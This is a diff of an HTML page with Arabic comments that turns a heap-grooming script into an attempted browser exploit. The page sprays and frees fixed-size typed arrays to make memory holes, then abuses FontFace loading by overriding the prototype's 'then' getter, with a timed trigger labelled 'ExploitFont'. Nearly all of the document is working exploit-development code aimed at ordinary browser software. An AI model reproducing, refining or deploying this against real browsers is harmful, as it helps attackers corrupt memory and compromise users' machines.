@@ -1,25 +1,37 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <div id="status">Grooming Heap...</div>
+    <div id="status">Waiting for trigger...</div>
     <script>
-        function groom() {
-            let fillers = [];
-            // 1. تصفيف الذاكرة بكتل ثابتة الحجم (0x1000)
-            // هذا يخلق "شبكة" منتظمة في الذاكرة
-            for (let i = 0; i < 500; i++) {
-                fillers.push(new Uint8Array(0x1000));
-            }
+        // 1. إعادة استخدام Grooming (تصفيف الذاكرة)
+        let fillers = [];
+        for (let i = 0; i < 500; i++) fillers.push(new Uint8Array(0x1000));
+        for (let i = 0; i < 500; i += 2) fillers[i] = null;
+
+        // 2. تفعيل الثغرة
+        function triggerTargetedExploit() {
+            document.getElementById('status').innerHTML = "Triggering...";
             
-            // 2. إحداث "ثقوب" (نحذف كل عنصر ثاني)
-            for (let i = 0; i < 500; i += 2) {
-                fillers[i] = null; 
-            }
-            
-            document.getElementById('status').innerHTML = "Heap Groomed. Holes created.";
-            console.log("Heap groomed successfully.");
+            let font = new FontFace('ExploitFont', 'local(Arial)', { unicodeRange: 'U+0041' });
+            document.fonts.add(font);
+
+            Object.defineProperty(FontFace.prototype, 'then', {
+                configurable: true,
+                get() {
+                    // هنا التوقيت الحساس: نحذف ونترك الـ FontFace يقع في الثقب
+                    setTimeout(() => {
+                        // محاولة إحداث التداخل هنا
+                        document.body.offsetTop; 
+                    }, 0);
+                    return undefined;
+                }
+            });
+
+            document.fonts.load('1em ExploitFont', 'A');
         }
-        groom();
+
+        // انتظر ثانية واحدة ثم ابدأ
+        setTimeout(triggerTargetedExploit, 1000);
     </script>
 </body>
 </html>
